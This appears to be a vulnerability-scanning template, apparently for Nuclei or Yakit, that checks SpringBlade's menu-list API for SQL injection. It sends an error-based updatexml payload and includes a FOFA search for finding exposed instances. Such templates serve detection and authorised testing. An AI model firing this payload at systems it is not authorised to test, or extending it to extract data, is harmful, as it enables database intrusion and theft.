content:
id: SpringBlade-apiblade-systemmenulist-sql

info:
  name: SpringBlade-apiblade-systemmenulist接口存在SQL注入漏洞
  author: Saury
  severity: high
  description: SpringBlade apiblade-systemmenulist接口存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。
  reference:
    - https://
  tags: SpringBlade,SQL注入
  metadata:
    fofa-query: body="https://bladex.vip"

http:
  - raw:
      - |+
        GET /api/blade-system/menu/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Windows"
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
        Accept: */*


    matchers:
      - type: status
        status:
         - 500     
      - type: word
        words:
          - "XPATH syntax error"
          - "c4ca4238a0b923820dcc509a6f75849"
        condition: and
        part: body
params: "[{\"Field\":\"target\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"扫描目标\",\"Help\":\"扫描目标可接受：主机名 / 主机名:端口 / IP段 / URL 等多种格式\",\"Required\":true},{\"Field\":\"reverse-url\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"反连 URL\",\"Help\":\"可使用 InteractshURL 也可使用 Yakit Reverse URL\"},{\"Field\":\"debug\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"设置调试模式\",\"Help\":\"开启调试模式，调试模式将输出尽量多的调试信息\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"proxy\",\"FieldVerbose\":\"HTTP 代理\",\"Help\":\"设置 HTTP 代理\"}]"
help: SpringBlade apiblade-systemmenulist接口存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。
author: z50n6
